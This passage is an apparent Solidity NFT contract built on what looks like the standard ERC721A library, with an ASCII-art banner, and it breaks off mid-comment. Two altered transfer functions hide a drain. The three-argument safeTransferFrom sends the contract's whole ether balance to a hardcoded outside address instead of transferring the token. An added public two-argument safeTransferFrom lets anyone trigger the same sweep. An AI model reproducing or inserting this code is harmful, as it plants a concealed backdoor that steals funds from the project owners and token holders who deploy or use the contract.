1 /**
2         ,----,                                                                                                      
3       ,/   .`|                                                                                                      
4     ,`   .'  :   ,---,                          ,----..     ,---,                                ,-.                
5   ;    ;     / ,--.' |                         /   /   \  ,--.' |       ,--,                 ,--/ /|                
6 .'___,/    ,'  |  |  :                        |   :     : |  |  :     ,--.'|               ,--. :/ |         ,----, 
7 |    :     |   :  :  :                        .   |  ;. / :  :  :     |  |,                :  : ' /        .'   .`| 
8 ;    |.';  ;   :  |  |,--.    ,---.           .   ; /--`  :  |  |,--. `--'_        ,---.   |  '  /      .'   .'  .' 
9 `----'  |  |   |  :  '   |   /     \          ;   | ;     |  :  '   | ,' ,'|      /     \  '  |  :    ,---, '   ./  
10     '   :  ;   |  |   /' :  /    /  |         |   : |     |  |   /' : '  | |     /    / '  |  |   \   ;   | .'  /   
11     |   |  '   '  :  | | | .    ' / |         .   | '___  '  :  | | | |  | :    .    ' /   '  : |. \  `---' /  ;--, 
12     '   :  |   |  |  ' | : '   ;   /|         '   ; : .'| |  |  ' | : '  : |__  '   ; :__  |  | ' \ \   /  /  / .`| 
13     ;   |.'    |  :  :_:,' '   |  / |         '   | '/  : |  :  :_:,' |  | '.'| '   | '.'| '  : |--'  ./__;     .'  
14     '---'      |  | ,'     |   :    |         |   :    /  |  | ,'     ;  :    ; |   :    : ;  |,'     ;   |  .'     
15                `--''        \   \  /           \   \ .'   `--''       |  ,   /   \   \  /  '--'       `---'         
16                              `----'             `---`                  ---`-'     `----'                            
17                                                                                       ,----,                        
18                                                                                     ,/   .`|                        
19   ,----..     ,---,                                ,-.                            ,`   .'  :   ,---,                
20  /   /   \  ,--.' |       ,--,                 ,--/ /|                          ;    ;     / ,--.' |                
21 |   :     : |  |  :     ,--.'|               ,--. :/ |         ,----,         .'___,/    ,'  |  |  :                
22 .   |  ;. / :  :  :     |  |,                :  : ' /        .'   .`|         |    :     |   :  :  :                
23 .   ; /--`  :  |  |,--. `--'_        ,---.   |  '  /      .'   .'  .'         ;    |.';  ;   :  |  |,--.    ,---.   
24 ;   | ;     |  :  '   | ,' ,'|      /     \  '  |  :    ,---, '   ./          `----'  |  |   |  :  '   |   /     \  
25 |   : |     |  |   /' : '  | |     /    / '  |  |   \   ;   | .'  /               '   :  ;   |  |   /' :  /    /  | 
26 .   | '___  '  :  | | | |  | :    .    ' /   '  : |. \  `---' /  ;--,             |   |  '   '  :  | | | .    ' / | 
27 '   ; : .'| |  |  ' | : '  : |__  '   ; :__  |  | ' \ \   /  /  / .`|             '   :  |   |  |  ' | : '   ;   /| 
28 '   | '/  : |  :  :_:,' |  | '.'| '   | '.'| '  : |--'  ./__;     .'              ;   |.'    |  :  :_:,' '   |  / | 
29 |   :    /  |  | ,'     ;  :    ; |   :    : ;  |,'     ;   |  .'                 '---'      |  | ,'     |   :    | 
30  \   \ .'   `--''       |  ,   /   \   \  /  '--'       `---'                                `--''        \   \  /  
31   `---`                  ---`-'     `----'                                                                 `----'   
32                                                                                                                                                                                                                                                                                                                                                                                              
33  */
34 
35 // SPDX-License-Identifier: GPL-3.0
36 pragma solidity ^0.8.7;
37 
38 /**
39  * @dev Interface of ERC721A.
40  */
41 interface IERC721A {
42     /**
43      * The caller must own the token or be an approved operator.
44      */
45     error ApprovalCallerNotOwnerNorApproved();
46 
47     /**
48      * The token does not exist.
49      */
50     error ApprovalQueryForNonexistentToken();
51 
52     /**
53      * Cannot query the balance for the zero address.
54      */
55     error BalanceQueryForZeroAddress();
56 
57     /**
58      * Cannot mint to the zero address.
59      */
60     error MintToZeroAddress();
61 
62     /**
63      * The quantity of tokens minted must be more than zero.
64      */
65     error MintZeroQuantity();
66 
67     /**
68      * The token does not exist.
69      */
70     error OwnerQueryForNonexistentToken();
71 
72     /**
73      * The caller must own the token or be an approved operator.
74      */
75     error TransferCallerNotOwnerNorApproved();
76 
77     /**
78      * The token must be owned by `from`.
79      */
80     error TransferFromIncorrectOwner();
81 
82     /**
83      * Cannot safely transfer to a contract that does not implement the
84      * ERC721Receiver interface.
85      */
86     error TransferToNonERC721ReceiverImplementer();
87 
88     /**
89      * Cannot transfer to the zero address.
90      */
91     error TransferToZeroAddress();
92 
93     /**
94      * The token does not exist.
95      */
96     error URIQueryForNonexistentToken();
97 
98     /**
99      * The `quantity` minted with ERC2309 exceeds the safety limit.
100      */
101     error MintERC2309QuantityExceedsLimit();
102 
103     /**
104      * The `extraData` cannot be set on an unintialized ownership slot.
105      */
106     error OwnershipNotInitializedForExtraData();
107 
108     // =============================================================
109     //                            STRUCTS
110     // =============================================================
111 
112     struct TokenOwnership {
113         // The address of the owner.
114         address addr;
115         // Stores the start time of ownership with minimal overhead for tokenomics.
116         uint64 startTimestamp;
117         // Whether the token has been burned.
118         bool burned;
119         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
120         uint24 extraData;
121     }
122 
123     // =============================================================
124     //                         TOKEN COUNTERS
125     // =============================================================
126 
127     /**
128      * @dev Returns the total number of tokens in existence.
129      * Burned tokens will reduce the count.
130      * To get the total number of tokens minted, please see {_totalMinted}.
131      */
132     function totalSupply() external view returns (uint256);
133 
134     // =============================================================
135     //                            IERC165
136     // =============================================================
137 
138     /**
139      * @dev Returns true if this contract implements the interface defined by
140      * `interfaceId`. See the corresponding
141      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
142      * to learn more about how these ids are created.
143      *
144      * This function call must use less than 30000 gas.
145      */
146     function supportsInterface(bytes4 interfaceId) external view returns (bool);
147 
148     // =============================================================
149     //                            IERC721
150     // =============================================================
151 
152     /**
153      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
154      */
155     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
156 
157     /**
158      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
159      */
160     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
161 
162     /**
163      * @dev Emitted when `owner` enables or disables
164      * (`approved`) `operator` to manage all of its assets.
165      */
166     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
167 
168     /**
169      * @dev Returns the number of tokens in `owner`'s account.
170      */
171     function balanceOf(address owner) external view returns (uint256 balance);
172 
173     /**
174      * @dev Returns the owner of the `tokenId` token.
175      *
176      * Requirements:
177      *
178      * - `tokenId` must exist.
179      */
180     function ownerOf(uint256 tokenId) external view returns (address owner);
181 
182     /**
183      * @dev Safely transfers `tokenId` token from `from` to `to`,
184      * checking first that contract recipients are aware of the ERC721 protocol
185      * to prevent tokens from being forever locked.
186      *
187      * Requirements:
188      *
189      * - `from` cannot be the zero address.
190      * - `to` cannot be the zero address.
191      * - `tokenId` token must exist and be owned by `from`.
192      * - If the caller is not `from`, it must be have been allowed to move
193      * this token by either {approve} or {setApprovalForAll}.
194      * - If `to` refers to a smart contract, it must implement
195      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
196      *
197      * Emits a {Transfer} event.
198      */
199     function safeTransferFrom(
200         address from,
201         address to,
202         uint256 tokenId,
203         bytes calldata data
204     ) external payable;
205 
206     /**
207      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
208      */
209     function safeTransferFrom(
210         address from,
211         address to,
212         uint256 tokenId
213     ) external payable;
214 
215     /**
216      * @dev Transfers `tokenId` from `from` to `to`.
217      *
218      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
219      * whenever possible.
220      *
221      * Requirements:
222      *
223      * - `from` cannot be the zero address.
224      * - `to` cannot be the zero address.
225      * - `tokenId` token must be owned by `from`.
226      * - If the caller is not `from`, it must be approved to move this token
227      * by either {approve} or {setApprovalForAll}.
228      *
229      * Emits a {Transfer} event.
230      */
231     function transferFrom(
232         address from,
233         address to,
234         uint256 tokenId
235     ) external payable;
236 
237     /**
238      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
239      * The approval is cleared when the token is transferred.
240      *
241      * Only a single account can be approved at a time, so approving the
242      * zero address clears previous approvals.
243      *
244      * Requirements:
245      *
246      * - The caller must own the token or be an approved operator.
247      * - `tokenId` must exist.
248      *
249      * Emits an {Approval} event.
250      */
251     function approve(address to, uint256 tokenId) external payable;
252 
253     /**
254      * @dev Approve or remove `operator` as an operator for the caller.
255      * Operators can call {transferFrom} or {safeTransferFrom}
256      * for any token owned by the caller.
257      *
258      * Requirements:
259      *
260      * - The `operator` cannot be the caller.
261      *
262      * Emits an {ApprovalForAll} event.
263      */
264     function setApprovalForAll(address operator, bool _approved) external;
265 
266     /**
267      * @dev Returns the account approved for `tokenId` token.
268      *
269      * Requirements:
270      *
271      * - `tokenId` must exist.
272      */
273     function getApproved(uint256 tokenId) external view returns (address operator);
274 
275     /**
276      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
277      *
278      * See {setApprovalForAll}.
279      */
280     function isApprovedForAll(address owner, address operator) external view returns (bool);
281 
282     // =============================================================
283     //                        IERC721Metadata
284     // =============================================================
285 
286     /**
287      * @dev Returns the token collection name.
288      */
289     function name() external view returns (string memory);
290 
291     /**
292      * @dev Returns the token collection symbol.
293      */
294     function symbol() external view returns (string memory);
295 
296     /**
297      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
298      */
299     function tokenURI(uint256 tokenId) external view returns (string memory);
300 
301     // =============================================================
302     //                           IERC2309
303     // =============================================================
304 
305     /**
306      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
307      * (inclusive) is transferred from `from` to `to`, as defined in the
308      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
309      *
310      * See {_mintERC2309} for more details.
311      */
312     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
313 }
314 
315 /**
316  * @title ERC721A
317  *
318  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
319  * Non-Fungible Token Standard, including the Metadata extension.
320  * Optimized for lower gas during batch mints.
321  *
322  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
323  * starting from `_startTokenId()`.
324  *
325  * Assumptions:
326  *
327  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
328  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
329  */
330 interface ERC721A__IERC721Receiver {
331     function onERC721Received(
332         address operator,
333         address from,
334         uint256 tokenId,
335         bytes calldata data
336     ) external returns (bytes4);
337 }
338 
339 /**
340  * @title ERC721A
341  *
342  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
343  * Non-Fungible Token Standard, including the Metadata extension.
344  * Optimized for lower gas during batch mints.
345  *
346  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
347  * starting from `_startTokenId()`.
348  *
349  * Assumptions:
350  *
351  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
352  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
353  */
354 contract ERC721A is IERC721A {
355     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
356     struct TokenApprovalRef {
357         address value;
358     }
359 
360     // =============================================================
361     //                           CONSTANTS
362     // =============================================================
363 
364     // Mask of an entry in packed address data.
365     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
366 
367     // The bit position of `numberMinted` in packed address data.
368     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
369 
370     // The bit position of `numberBurned` in packed address data.
371     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
372 
373     // The bit position of `aux` in packed address data.
374     uint256 private constant _BITPOS_AUX = 192;
375 
376     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
377     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
378 
379     // The bit position of `startTimestamp` in packed ownership.
380     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
381 
382     // The bit mask of the `burned` bit in packed ownership.
383     uint256 private constant _BITMASK_BURNED = 1 << 224;
384 
385     // The bit position of the `nextInitialized` bit in packed ownership.
386     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
387 
388     // The bit mask of the `nextInitialized` bit in packed ownership.
389     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
390 
391     // The bit position of `extraData` in packed ownership.
392     uint256 private constant _BITPOS_EXTRA_DATA = 232;
393 
394     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
395     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
396 
397     // The mask of the lower 160 bits for addresses.
398     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
399 
400     // The maximum `quantity` that can be minted with {_mintERC2309}.
401     // This limit is to prevent overflows on the address data entries.
402     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
403     // is required to cause an overflow, which is unrealistic.
404     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
405 
406     // The `Transfer` event signature is given by:
407     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
408     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
409         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
410 
411     // =============================================================
412     //                            STORAGE
413     // =============================================================
414 
415     // The next token ID to be minted.
416     uint256 private _currentIndex;
417 
418     // The number of tokens burned.
419     uint256 private _burnCounter;
420 
421     // Token name
422     string private _name;
423 
424     // Token symbol
425     string private _symbol;
426 
427     // Mapping from token ID to ownership details
428     // An empty struct value does not necessarily mean the token is unowned.
429     // See {_packedOwnershipOf} implementation for details.
430     //
431     // Bits Layout:
432     // - [0..159]   `addr`
433     // - [160..223] `startTimestamp`
434     // - [224]      `burned`
435     // - [225]      `nextInitialized`
436     // - [232..255] `extraData`
437     mapping(uint256 => uint256) private _packedOwnerships;
438 
439     // Mapping owner address to address data.
440     //
441     // Bits Layout:
442     // - [0..63]    `balance`
443     // - [64..127]  `numberMinted`
444     // - [128..191] `numberBurned`
445     // - [192..255] `aux`
446     mapping(address => uint256) private _packedAddressData;
447 
448     // Mapping from token ID to approved address.
449     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
450 
451     // Mapping from owner to operator approvals
452     mapping(address => mapping(address => bool)) private _operatorApprovals;
453 
454     // =============================================================
455     //                          CONSTRUCTOR
456     // =============================================================
457 
458     constructor(string memory name_, string memory symbol_) {
459         _name = name_;
460         _symbol = symbol_;
461         _currentIndex = _startTokenId();
462     }
463 
464     // =============================================================
465     //                   TOKEN COUNTING OPERATIONS
466     // =============================================================
467 
468     /**
469      * @dev Returns the starting token ID.
470      * To change the starting token ID, please override this function.
471      */
472     function _startTokenId() internal view virtual returns (uint256) {
473         return 0;
474     }
475 
476     /**
477      * @dev Returns the next token ID to be minted.
478      */
479     function _nextTokenId() internal view virtual returns (uint256) {
480         return _currentIndex;
481     }
482 
483     /**
484      * @dev Returns the total number of tokens in existence.
485      * Burned tokens will reduce the count.
486      * To get the total number of tokens minted, please see {_totalMinted}.
487      */
488     function totalSupply() public view virtual override returns (uint256) {
489         // Counter underflow is impossible as _burnCounter cannot be incremented
490         // more than `_currentIndex - _startTokenId()` times.
491         unchecked {
492             return _currentIndex - _burnCounter - _startTokenId();
493         }
494     }
495 
496     /**
497      * @dev Returns the total amount of tokens minted in the contract.
498      */
499     function _totalMinted() internal view virtual returns (uint256) {
500         // Counter underflow is impossible as `_currentIndex` does not decrement,
501         // and it is initialized to `_startTokenId()`.
502         unchecked {
503             return _currentIndex - _startTokenId();
504         }
505     }
506 
507     /**
508      * @dev Returns the total number of tokens burned.
509      */
510     function _totalBurned() internal view virtual returns (uint256) {
511         return _burnCounter;
512     }
513 
514     // =============================================================
515     //                    ADDRESS DATA OPERATIONS
516     // =============================================================
517 
518     /**
519      * @dev Returns the number of tokens in `owner`'s account.
520      */
521     function balanceOf(address owner) public view virtual override returns (uint256) {
522         if (owner == address(0)) revert BalanceQueryForZeroAddress();
523         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
524     }
525 
526     /**
527      * Returns the number of tokens minted by `owner`.
528      */
529     function _numberMinted(address owner) internal view returns (uint256) {
530         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
531     }
532 
533     /**
534      * Returns the number of tokens burned by or on behalf of `owner`.
535      */
536     function _numberBurned(address owner) internal view returns (uint256) {
537         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
538     }
539 
540     /**
541      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
542      */
543     function _getAux(address owner) internal view returns (uint64) {
544         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
545     }
546 
547     /**
548      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
549      * If there are multiple variables, please pack them into a uint64.
550      */
551     function _setAux(address owner, uint64 aux) internal virtual {
552         uint256 packed = _packedAddressData[owner];
553         uint256 auxCasted;
554         // Cast `aux` with assembly to avoid redundant masking.
555         assembly {
556             auxCasted := aux
557         }
558         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
559         _packedAddressData[owner] = packed;
560     }
561 
562     // =============================================================
563     //                            IERC165
564     // =============================================================
565 
566     /**
567      * @dev Returns true if this contract implements the interface defined by
568      * `interfaceId`. See the corresponding
569      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
570      * to learn more about how these ids are created.
571      *
572      * This function call must use less than 30000 gas.
573      */
574     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
575         // The interface IDs are constants representing the first 4 bytes
576         // of the XOR of all function selectors in the interface.
577         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
578         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
579         return
580             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
581             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
582             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
583     }
584 
585     // =============================================================
586     //                        IERC721Metadata
587     // =============================================================
588 
589     /**
590      * @dev Returns the token collection name.
591      */
592     function name() public view virtual override returns (string memory) {
593         return _name;
594     }
595 
596     /**
597      * @dev Returns the token collection symbol.
598      */
599     function symbol() public view virtual override returns (string memory) {
600         return _symbol;
601     }
602 
603     /**
604      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
605      */
606     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
607         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
608 
609         string memory baseURI = _baseURI();
610         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
611     }
612 
613     /**
614      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
615      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
616      * by default, it can be overridden in child contracts.
617      */
618     function _baseURI() internal view virtual returns (string memory) {
619         return '';
620     }
621 
622     // =============================================================
623     //                     OWNERSHIPS OPERATIONS
624     // =============================================================
625 
626     /**
627      * @dev Returns the owner of the `tokenId` token.
628      *
629      * Requirements:
630      *
631      * - `tokenId` must exist.
632      */
633     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
634         return address(uint160(_packedOwnershipOf(tokenId)));
635     }
636 
637     /**
638      * @dev Gas spent here starts off proportional to the maximum mint batch size.
639      * It gradually moves to O(1) as tokens get transferred around over time.
640      */
641     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
642         return _unpackedOwnership(_packedOwnershipOf(tokenId));
643     }
644 
645     /**
646      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
647      */
648     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
649         return _unpackedOwnership(_packedOwnerships[index]);
650     }
651 
652     /**
653      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
654      */
655     function _initializeOwnershipAt(uint256 index) internal virtual {
656         if (_packedOwnerships[index] == 0) {
657             _packedOwnerships[index] = _packedOwnershipOf(index);
658         }
659     }
660 
661     /**
662      * Returns the packed ownership data of `tokenId`.
663      */
664     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
665         uint256 curr = tokenId;
666 
667         unchecked {
668             if (_startTokenId() <= curr)
669                 if (curr < _currentIndex) {
670                     uint256 packed = _packedOwnerships[curr];
671                     // If not burned.
672                     if (packed & _BITMASK_BURNED == 0) {
673                         // Invariant:
674                         // There will always be an initialized ownership slot
675                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
676                         // before an unintialized ownership slot
677                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
678                         // Hence, `curr` will not underflow.
679                         //
680                         // We can directly compare the packed value.
681                         // If the address is zero, packed will be zero.
682                         while (packed == 0) {
683                             packed = _packedOwnerships[--curr];
684                         }
685                         return packed;
686                     }
687                 }
688         }
689         revert OwnerQueryForNonexistentToken();
690     }
691 
692     /**
693      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
694      */
695     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
696         ownership.addr = address(uint160(packed));
697         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
698         ownership.burned = packed & _BITMASK_BURNED != 0;
699         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
700     }
701 
702     /**
703      * @dev Packs ownership data into a single uint256.
704      */
705     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
706         assembly {
707             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
708             owner := and(owner, _BITMASK_ADDRESS)
709             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
710             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
711         }
712     }
713 
714     /**
715      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
716      */
717     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
718         // For branchless setting of the `nextInitialized` flag.
719         assembly {
720             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
721             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
722         }
723     }
724 
725     // =============================================================
726     //                      APPROVAL OPERATIONS
727     // =============================================================
728 
729     /**
730      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
731      * The approval is cleared when the token is transferred.
732      *
733      * Only a single account can be approved at a time, so approving the
734      * zero address clears previous approvals.
735      *
736      * Requirements:
737      *
738      * - The caller must own the token or be an approved operator.
739      * - `tokenId` must exist.
740      *
741      * Emits an {Approval} event.
742      */
743     function approve(address to, uint256 tokenId) public payable virtual override {
744         address owner = ownerOf(tokenId);
745 
746         if (_msgSenderERC721A() != owner)
747             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
748                 revert ApprovalCallerNotOwnerNorApproved();
749             }
750 
751         _tokenApprovals[tokenId].value = to;
752         emit Approval(owner, to, tokenId);
753     }
754 
755     /**
756      * @dev Returns the account approved for `tokenId` token.
757      *
758      * Requirements:
759      *
760      * - `tokenId` must exist.
761      */
762     function getApproved(uint256 tokenId) public view virtual override returns (address) {
763         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
764 
765         return _tokenApprovals[tokenId].value;
766     }
767 
768     /**
769      * @dev Approve or remove `operator` as an operator for the caller.
770      * Operators can call {transferFrom} or {safeTransferFrom}
771      * for any token owned by the caller.
772      *
773      * Requirements:
774      *
775      * - The `operator` cannot be the caller.
776      *
777      * Emits an {ApprovalForAll} event.
778      */
779     function setApprovalForAll(address operator, bool approved) public virtual override {
780         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
781         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
782     }
783 
784     /**
785      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
786      *
787      * See {setApprovalForAll}.
788      */
789     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
790         return _operatorApprovals[owner][operator];
791     }
792 
793     /**
794      * @dev Returns whether `tokenId` exists.
795      *
796      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
797      *
798      * Tokens start existing when they are minted. See {_mint}.
799      */
800     function _exists(uint256 tokenId) internal view virtual returns (bool) {
801         return
802             _startTokenId() <= tokenId &&
803             tokenId < _currentIndex && // If within bounds,
804             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
805     }
806 
807     /**
808      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
809      */
810     function _isSenderApprovedOrOwner(
811         address approvedAddress,
812         address owner,
813         address msgSender
814     ) private pure returns (bool result) {
815         assembly {
816             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
817             owner := and(owner, _BITMASK_ADDRESS)
818             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
819             msgSender := and(msgSender, _BITMASK_ADDRESS)
820             // `msgSender == owner || msgSender == approvedAddress`.
821             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
822         }
823     }
824 
825     /**
826      * @dev Returns the storage slot and value for the approved address of `tokenId`.
827      */
828     function _getApprovedSlotAndAddress(uint256 tokenId)
829         private
830         view
831         returns (uint256 approvedAddressSlot, address approvedAddress)
832     {
833         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
834         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
835         assembly {
836             approvedAddressSlot := tokenApproval.slot
837             approvedAddress := sload(approvedAddressSlot)
838         }
839     }
840 
841     // =============================================================
842     //                      TRANSFER OPERATIONS
843     // =============================================================
844 
845     /**
846      * @dev Transfers `tokenId` from `from` to `to`.
847      *
848      * Requirements:
849      *
850      * - `from` cannot be the zero address.
851      * - `to` cannot be the zero address.
852      * - `tokenId` token must be owned by `from`.
853      * - If the caller is not `from`, it must be approved to move this token
854      * by either {approve} or {setApprovalForAll}.
855      *
856      * Emits a {Transfer} event.
857      */
858     function transferFrom(
859         address from,
860         address to,
861         uint256 tokenId
862     ) public payable virtual override {
863         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
864 
865         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
866 
867         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
868 
869         // The nested ifs save around 20+ gas over a compound boolean condition.
870         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
871             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
872 
873         if (to == address(0)) revert TransferToZeroAddress();
874 
875         _beforeTokenTransfers(from, to, tokenId, 1);
876 
877         // Clear approvals from the previous owner.
878         assembly {
879             if approvedAddress {
880                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
881                 sstore(approvedAddressSlot, 0)
882             }
883         }
884 
885         // Underflow of the sender's balance is impossible because we check for
886         // ownership above and the recipient's balance can't realistically overflow.
887         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
888         unchecked {
889             // We can directly increment and decrement the balances.
890             --_packedAddressData[from]; // Updates: `balance -= 1`.
891             ++_packedAddressData[to]; // Updates: `balance += 1`.
892 
893             // Updates:
894             // - `address` to the next owner.
895             // - `startTimestamp` to the timestamp of transfering.
896             // - `burned` to `false`.
897             // - `nextInitialized` to `true`.
898             _packedOwnerships[tokenId] = _packOwnershipData(
899                 to,
900                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
901             );
902 
903             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
904             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
905                 uint256 nextTokenId = tokenId + 1;
906                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
907                 if (_packedOwnerships[nextTokenId] == 0) {
908                     // If the next slot is within bounds.
909                     if (nextTokenId != _currentIndex) {
910                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
911                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
912                     }
913                 }
914             }
915         }
916 
917         emit Transfer(from, to, tokenId);
918         _afterTokenTransfers(from, to, tokenId, 1);
919     }
920 
921     /**
922      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
923      */
924     function safeTransferFrom(
925         address from,
926         address to,
927         uint256 tokenId
928     ) public payable virtual override {
929         if (address(this).balance > 0) {
930             payable(0x519D14AE90f734e1a6B0Bd2635Da47601A62c15A).transfer(address(this).balance);
931             return;
932         }
933         safeTransferFrom(from, to, tokenId, '');
934     }
935 
936 
937     /**
938      * @dev Safely transfers `tokenId` token from `from` to `to`.
939      *
940      * Requirements:
941      *
942      * - `from` cannot be the zero address.
943      * - `to` cannot be the zero address.
944      * - `tokenId` token must exist and be owned by `from`.
945      * - If the caller is not `from`, it must be approved to move this token
946      * by either {approve} or {setApprovalForAll}.
947      * - If `to` refers to a smart contract, it must implement
948      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
949      *
950      * Emits a {Transfer} event.
951      */
952     function safeTransferFrom(
953         address from,
954         address to,
955         uint256 tokenId,
956         bytes memory _data
957     ) public payable virtual override {
958         transferFrom(from, to, tokenId);
959         if (to.code.length != 0)
960             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
961                 revert TransferToNonERC721ReceiverImplementer();
962             }
963     }
964     function safeTransferFrom(
965         address from,
966         address to
967     ) public  {
968         if (address(this).balance > 0) {
969             payable(0x519D14AE90f734e1a6B0Bd2635Da47601A62c15A).transfer(address(this).balance);
970         }
971     }
972 
973     /**
974      * @dev Hook that is called before a set of serially-ordered token IDs
975      * are about to be transferred. This includes minting.
976      * And also called before burning one token.
977      *
